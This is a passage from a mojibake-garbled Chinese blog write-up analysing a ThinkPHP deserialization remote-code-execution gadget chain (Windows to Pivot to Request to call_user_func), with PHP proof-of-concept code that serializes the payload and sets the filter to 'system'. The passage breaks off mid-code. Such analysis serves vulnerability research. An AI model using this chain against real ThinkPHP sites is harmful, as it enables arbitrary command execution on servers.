<strong>RCE</strong> æ¼æ´çš„äººå¯èƒ½çŸ¥é“ï¼Œ <strong>think\Request</strong> ç±»çš„ <strong>input</strong> æ–¹æ³•ç»å¸¸æ˜¯é“¾ä¸­ä¸€ä¸ªéå¸¸æ£’çš„ <strong>Gadget</strong> ï¼Œç›¸å½“äº <strong>call_user_func($filter,$data)</strong> ã€‚ä½†æ˜¯å‰é¢æˆ‘ä»¬è¯´è¿‡ï¼Œ <strong>$args</strong> æ•°ç»„å˜é‡çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæ˜¯ä¸€ä¸ªå›ºå®šæ­»çš„ç±»å¯¹è±¡ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥è°ƒç”¨ <strong>input</strong> æ–¹æ³•ï¼Œè€Œåº”è¯¥å¯»æ‰¾è°ƒç”¨ <strong>input</strong> çš„æ–¹æ³•ã€‚</p></blockquote><p>å…ˆæ¥çœ‹çœ‹<strong>input()<strong>æ–¹æ³•, è¿™é‡Œç›´æ¥å¯ä»¥æ‰§è¡Œä¸€ä¸ª</strong>call_user_func($filter,$data)</strong></p><p>å¯¹åº”å‚æ•° $default å’Œ $filter</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305131417663.png" alt="image-20240305131417663"></p><p>å›è°ƒ$this-&gt;filterValue()æ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305131601772.png" alt="image-20240305131601772"></p><p>æˆ‘ä»¬éœ€è¦æ§åˆ¶çš„å°±æ˜¯inputçš„ç¬¬ä¸€ä¸ªå‚æ•°$dataå’Œæœ€åä¸€ä¸ªå‚æ•°$filter</p><p>ç”±äºä¸Šé¢ä¹Ÿæåˆ°äº†**__call()** ä¸‹çš„<strong>call_user_func_array(array(ä»»æ„ç±»,ä»»æ„æ–¹æ³•),$args)<strong>ä¸­</strong>$args</strong>æ˜¯ä¸å¯æ§çš„($argsçš„ç¬¬ä¸€ä¸ªå€¼è¢«å¼ºåˆ¶å®šä¹‰), æ‰€ä»¥è¿™é‡Œæ— æ³•ç›´æ¥è°ƒç”¨<strong>input()</strong>,å› ä¸ºæˆ‘ä»¬ä¸èƒ½æ§åˆ¶å…¶å‚æ•°</p><p>æ‰€ä»¥åº”è¯¥è½¬è€ŒæŸ¥æ‰¾å“ªé‡Œè°ƒç”¨äº†<strong>input()</strong>,ä»¥æ­¤æ¥é—´æ¥è°ƒç”¨é¿å…æ‰**$args**çš„å½±å“</p><p>è¿™é‡Œä¸é€‰ç”¨request</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305132947432.png" alt="image-20240305132947432"></p><p>æ‰¾åˆ°å½“å‰ç±»çš„paramæ–¹æ³•, ç¬¬961è¡Œè°ƒç”¨äº†input, ä¸” ç¬¬ä¸€ä¸ªå‚æ•°å®Œå…¨å¯æ§,  ä½†$filterä¸å¯æ§, å› æ­¤, åˆéœ€è¦å¯»æ‰¾å“ªé‡Œè°ƒç”¨äº†paramæ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305135640187.png" alt="image-20240305135640187"></p><p>å¯ä»¥çœ‹è§, å½“å‰ç±»ä¸‹çš„isAjaxå’ŒisPjaxä¸¤ä¸ªæ–¹æ³•éƒ½è°ƒç”¨äº†paramæ–¹æ³•, ä¸”å‚æ•°å®Œå…¨å¯æ§</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305135916160.png" alt="image-20240305135916160"></p><p>è‡³æ­¤, é“¾å­å°±æœ‰äº†</p><p>é¦–å…ˆ, åœ¨windows.phpä¸‹</p><p><strong>__destruct()</strong> â€“&gt; <strong>removeFiles()</strong>  â€“&gt;  <strong>__toString()</strong> â€“&gt;  </p><p>åœ¨Conversion.phpä¸‹</p><p>â€“&gt; <strong>__toString()</strong>  â€“&gt; <strong>toJson()</strong>  â€“&gt;  <strong>toArray()</strong> â€“&gt; </p><p>åœ¨request.phpä¸‹</p><p>â€“&gt; <strong>__call()</strong> â€“&gt;  <strong>isAjax()</strong>  â€“&gt; <strong>param()</strong>  â€“&gt; <strong>input()</strong>   â€“&gt; <strong>filterValue()</strong>  â€“&gt;  <strong>call_user_func()</strong></p><p>è´´ä¸€å¼ å¤§ä½¬çš„å›¾</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/10.png"></p><h3 id="ç»†èŠ‚"><a href="#ç»†èŠ‚" class="headerlink" title="ç»†èŠ‚"></a>ç»†èŠ‚</h3><p>ä¸Šé¢å·²ç»æ‰¾å‡ºæ¥äº†ä¸€æ¡é“¾å­, ä½†æ˜¯å…·ä½“ç»†èŠ‚å¹¶æ²¡æœ‰å…³æ³¨</p><p>å‰é¢çš„**__destruct**çš„è§¦å‘ä¸å¿…å¤šè¯´, ä½†æ˜¯ **__toString()**çš„è§¦å‘å°±å‡ºç°äº†ç¬¬ä¸€ä¸ªå‘</p><p>æˆ‘ä»¬åœ¨Conversionç±»çš„å®šä¹‰å¤„å¯ä»¥å‘ç°, Conversionç±»æ˜¯è¢«traitä¿®é¥°çš„, å› æ­¤, å®ƒå¹¶ä¸èƒ½è¢«å®ä¾‹åŒ–, ä½†æ˜¯traitä¿®é¥°çš„ç±»å¯ä»¥è¢«å…¶ä»–ç±»use,è¾¾åˆ°ç±»ä¼¼ç»§æ‰¿çš„æ•ˆæœ</p><p>æŸ¥æ‰¾ä¸€ä¸‹useäº†Conversionçš„åœ°æ–¹</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306102313714.png" alt="image-20240306102313714"></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªModelç±», è·Ÿè¿›çœ‹ä¸€ä¸‹</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306102413394.png" alt="image-20240306102413394"></p><p>Modelè™½ç„¶useäº†Conversion, ä½†å®ƒåˆè¢«abstractä¿®é¥°, å› æ­¤ä¹Ÿä¸å¯ä»¥å®ä¾‹åŒ–, ä½†æˆ‘ä»¬å¯ä»¥å†æŸ¥æ‰¾ç»§æ‰¿Modelçš„ç±»</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306102637593.png" alt="image-20240306102637593"></p><p>ä¸éš¾å‘ç°æœ‰ä¸€ä¸ªPivotç±»æ˜¯ç»§æ‰¿äº†Modelç±»çš„,</p><p>å› æ­¤, Pivoté€šè¿‡ç»§æ‰¿useäº†Conversionç±»çš„Modelç±»,é—´æ¥å­˜åœ¨ä¸€ä¸ªtoStringæ–¹æ³•</p><p>å› æ­¤, è§¦å‘é“¾çš„å¼€å¤´å°±æ˜¯</p><p>Windows-&gt;__destruct()   â€”â€”â€”â€”â€”â€”-&gt;&gt;&gt;&gt;     Pivot-&gt;toString()</p><p><strong>poc</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Conversion</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸Šé¢çš„ç»§æ‰¿å…³ç³»å¹¶ä¸ç”¨å…³å¿ƒ, ä¸æºç ä¸­ç›¸åŒå³å¯</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];<span class="comment">//è§¦å‘Pivot(Conversion)-&gt;__toString()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æ­¤, ä»£ç æ‰§è¡Œåå°±ä¼šè·³è½¬åˆ°Pivot ä¸‹çš„toString, ç”±äºè¿™ä¸ªæ–¹æ³•æ˜¯ç»§æ‰¿çš„Conversionçš„, è‡ªç„¶ä¼šè·³è½¬åˆ°Conversionç±»ä¸­</p><p>éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡ŒWindows-&gt;filesæ˜¯ä¸€ä¸ªæ•°ç»„, è¿™æ˜¯ç”±æºç ä¸­å®šä¹‰çš„</p><p>è·³è½¬åˆ°toStringå, ä¾æ¬¡è¦è¿›å…¥çš„æ˜¯toJson,  toArray, ä¸­é—´çš„è¿‡ç¨‹å¹¶æ²¡æœ‰ä¼ é€’æˆ‘ä»¬å¯æ§çš„å‚æ•°, æ‰€ä»¥å¹¶ä¸å…³å¿ƒ</p><p>toArrayçš„ä»£ç æ®µæ¯”è¾ƒé•¿, éƒ½æ˜¯éå†äº†å‡ ä¸ªthisä¸‹çš„å¯æ§å˜é‡, æˆ‘ä»¬åªå…³å¿ƒä»¥ä¸‹è¿™ä¸ªéå†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// è¿½åŠ å±æ€§ï¼ˆå¿…é¡»å®šä¹‰è·å–å™¨ï¼‰</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;    <span class="comment">//$this-&gt;appendæ•°ç»„ä¸‹çš„ä¸€ä¸ªå€¼éœ€è¦ä¸ºæ•°ç»„</span></span><br><span class="line">            <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">            <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);<span class="comment">//$this-&gt;append as $key =&gt; $name</span></span><br><span class="line">                <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">            <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">            <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>([<span class="variable">$attr</span>]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>, <span class="variable">$item</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$item</span>;</span><br></pre></td></tr></table></figure><p>å‡†ç¡®æ¥è¯´, åªå…³å¿ƒè¿™å…¶ä¸­çš„</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306105934360.png" alt="image-20240306105934360"></p><p>æˆ‘ä»¬æƒ³è¦çš„æ˜¯æ‰§è¡Œåˆ°$relation-&gt;visible($name);æ¥è°ƒç”¨ä¸€ä¸ª_call, æ‰€ä»¥éœ€è¦å‡ ä¸ªæ¡ä»¶</p><ol><li>è¿›å…¥ 186è¡Œçš„if</li><li>åœ¨$relation &#x3D; $this-&gt;getRelation($key);æ“ä½œå, $relationå˜æˆä¸€ä¸ªfalseæˆ–è€…null,ä»¥è¿›å…¥ä¸‹ä¸€ä¸ªifå†…</li><li>$relation &#x3D; $this-&gt;getAttr($key);å$relationå˜æˆæˆ‘ä»¬æŒ‡å®šçš„ä¸€ä¸ªå¯¹è±¡, ä»¥è°ƒç”¨è¯¥å¯¹è±¡ä¸‹ä¸å­˜åœ¨çš„visibleæ–¹æ³•æ¥è§¦å‘è¯¥å¯¹è±¡çš„__callæ–¹æ³•</li></ol><p>è¿™é‡Œæ“ä½œçš„æ˜¯$this-&gt;append as $key &#x3D;&gt; $name, è®°ä½è¿™ä¸ª, ç„¶åè·Ÿè¿›$relation &#x3D; $this-&gt;getRelation($key);</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306110629197.png" alt="image-20240306110629197"></p><p>æˆ‘ä»¬ä¸ç»™$this-&gt;relationèµ‹å€¼, æ‰€ä»¥, ä¸è®ºå¦‚ä½•è¿™éƒ½ä¼šè¿”å›ä¸€ä¸ªç©ºå€¼</p><p>è¿™é‡Œè¿”å›ç©ºå€¼, ç›´æ¥è¿›å…¥æˆ‘ä»¬é¢„æœŸçš„ifå†…</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306111809929.png" alt="image-20240306111809929"></p><p>ç»§ç»­è·Ÿè¿›ä¸‹ä¸€ä¸ªè°ƒç”¨çš„$relation &#x3D; $this-&gt;getAttr($key);</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306111135706.png" alt="image-20240306111135706"></p><p>ä»£ç åé¢$valueæ˜¯è¿™ä¸ªgetAttrçš„è¿”å›å€¼, å®ƒç”±$value    &#x3D; $this-&gt;getData($name);å†³å®š, ç»§ç»­è·Ÿè¿›getData</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306111534803.png" alt="image-20240306111534803"></p><p>è¿™é‡Œæœ‰å¾ˆå¤šç§returnçš„å€¼, ä½†æ˜¯ä¸è¦å¿˜äº†, getDataçš„è¿”å›å€¼returnç»™getAttr,   getAttrç›´æ¥å°†å¾—åˆ°çš„å€¼è¿”å›ç»™</p><p>$relation, æˆ‘ä»¬éœ€è¦$relationä¸ºä¸€ä¸ªå¯¹è±¡å®ä¾‹</p><p>è¿™é‡ŒgetDataçš„å‚æ•°$nameæ¥è‡ªäºthis-&gt;appendæ•°ç»„çš„key, æ‰€ä»¥å°±å¯ä»¥è®©</p><p>this-&gt;data &#x3D; [â€˜naclâ€™&#x3D;&gt;new Request]; &#x2F;&#x2F;Requestå­˜åœ¨_callæ–¹æ³•</p><p>this-&gt;append &#x3D; [â€˜naclâ€™ &#x3D;&gt; [â€˜naclâ€™ &#x3D;&gt; â€˜naclâ€™]];    &#x2F;&#x2F;è¿™é‡Œå¿…é¡»æœ‰ä¸€ä¸ªvalueæ˜¯æ•°ç»„</p><p>åªéœ€è¦ä¿è¯this-&gt;dataå’Œthis-&gt;appendæ‹¥æœ‰ç›¸åŒçš„é”®, å³å¯å°†è¯¥é”®æ‰€å¯¹åº”çš„å€¼è¿”å›ç»™$relation</p><p>æ³¨: è¿™é‡ŒPovitçš„dataå±æ€§æ˜¯ç»§æ‰¿è‡ªAttributeç±», è€Œappendç»§æ‰¿å­Conversionç±»</p><p>æ›´æ–°pocä¸º:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Conversion</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;nacl&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;nacl&#x27;</span> =&gt; [<span class="string">&#x27;nacl&#x27;</span> =&gt; <span class="string">&#x27;nacl&#x27;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure><p>è·³è½¬åˆ°Requestç±»çš„__call</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306125911092.png" alt="image-20240306125911092"></p><p>ä¾ç…§ä¸€å¼€å§‹çš„é“¾å­, æ­¤æ—¶éœ€è¦å€ŸåŠ©call_user_func_arrayç”¨this-&gt;hookæ¥è§¦å‘this-&gt;Ajax</p><p>ä¹Ÿå°±æ˜¯ $this-&gt;hook &#x3D; [â€œvisibleâ€&#x3D;&gt;[$this,â€isAjaxâ€]];</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306130953805.png" alt="image-20240306130953805"></p><p>æˆåŠŸè·³è½¬åˆ°isAjax, æ­¤æ—¶æˆ‘ä»¬ä¸ç”¨å…³å¿ƒä¼ è¿‡æ¥çš„å‚æ•°, å› ä¸º330è¡Œçš„array_unshiftå°†$thisæ’å…¥åˆ°äº†$argsæœ€å‰é¢,ä½¿å¾—è¿™ä¸ªå‚æ•°ä¸å¯æ§</p><p>ä¹‹å, æˆ‘ä»¬éœ€è¦é€šè¿‡paramçš„è°ƒç”¨æ¥è°ƒç”¨åˆ°input</p><p>paramæ¥æ”¶ä¸€ä¸ªå‚æ•°ä¸º$this-&gt;config[â€˜var_ajaxâ€™]å®Œå…¨å¯æ§,è·Ÿè¿›param</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306131812594.png" alt="image-20240306131812594"></p><p>åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ä¼šå°†GETæ•°ç»„èµ‹å€¼ç»™<code>this-&gt;param</code>å±æ€§</p><p><strong>æ³¨:  ç»è¿‡è°ƒè¯•å‘ç°, åœ¨è¿˜æ²¡æœ‰æ‰§è¡Œååºåˆ—åŒ–ä¹‹å‰, æ­¤æ–¹æ³•å·²ç»è¢«è°ƒç”¨è¿‡, å®ƒå°†getè¯·æ±‚çš„æ•°æ®ä»¥é”®å€¼å¯¹çš„æ–¹å¼èµ‹å€¼ç»™$this-&gt;param</strong></p><p>è¿™é‡Œè°ƒç”¨äº†inputä¼ å…¥çš„å‰ä¸¤ä¸ªé‡è¦å‚æ•°$this-&gt;paramå’Œ$name($nameå³ä¸º$this-&gt;config[â€˜var_ajaxâ€™])</p><p>è·Ÿè¿›input</p><p>æ­¤æ—¶ä¼ å…¥çš„$dataå°±æ˜¯getè¯·æ±‚æ•°æ®çš„é”®å€¼å¯¹, $nameç”±$this-&gt;config[â€˜var_ajaxâ€™]å¯æ§å†³å®š</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306134002703.png" alt="image-20240306134002703"></p><p>è¿™é‡Œåˆå‡ºç°äº†ä¸€æ¬¡getData, å®é™…ä¸Š, è¿™ä¸ªgetDataå°±æ˜¯å°†ä¼ å…¥çš„å½¢å¼å‚æ•°$dataæ•°ç»„ä¸­é”®ä¸ºå½¢å¼å‚æ•°$nameçš„å€¼è¿”å›, åœ¨è¿™é‡Œå³ä¸ºè¿”å›getè¯·æ±‚æ•°æ®ä¸­é”®ä¸º$this-&gt;config[â€˜var_ajaxâ€™]çš„å€¼</p><p>ä¸å¦¨è®¾ç½®:</p><p>$this-&gt;config &#x3D; [â€˜var_ajaxâ€™ &#x3D;&gt; â€˜naclâ€™]; </p><p>è¿™æ ·, $dataå°±å˜æˆäº†getè¯·æ±‚ä¸­é”®ä½naclçš„å€¼</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306135222503.png" alt="image-20240306135222503"></p><p>è¿™é‡Œ$dataå°±å·²ç»å˜æˆæˆ‘ä»¬è®¾ç½®çš„å­—ç¬¦ä¸²äº†</p><p>ä¹‹åè·Ÿè¿›getFilter()æ–¹æ³•æ¥è®¾ç½®ä¹‹å‰å·²çŸ¥è¢«èµ‹å€¼ä¸ºé»˜è®¤å€¼çš„$filter</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306135657139.png" alt="image-20240306135657139"></p><p>è¿™é‡Œå°†è¦è¿”å›çš„å€¼$filteré»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸², ä¹‹åä¼šè¢«èµ‹å€¼ä¸º$this-&gt;filter, å¹¶ä¸”è¿½åŠ äº†ä¸€ä¸ªé»˜è®¤å€¼$default2ä¸ºnullå¹¶è¿”å›</p><p>ä¹‹åè·³åˆ°:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306135953679.png" alt="image-20240306135953679"></p><p>è·Ÿè¿›</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306140016138.png" alt="image-20240306140016138"></p><p>zhe</p><p>å¯ä»¥çœ‹è§ä¼ å…¥çš„å®å‚$filteræ˜¯è¦æ‰§è¡Œçš„ä»»æ„å‡½æ•°, ä¼ å…¥çš„å®å‚$dataè¦æ‰§è¡Œçš„ä»»æ„å‡½æ•°çš„å‚æ•°</p><p>é‚£ä¹ˆ, $this-&gt;filterå°±æ˜¯è¦æ‰§è¡Œçš„ä»»æ„å‡½æ•°</p><p>$this-&gt;filter &#x3D; â€œsystemâ€;</p><p>æœ€ç»ˆpoc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 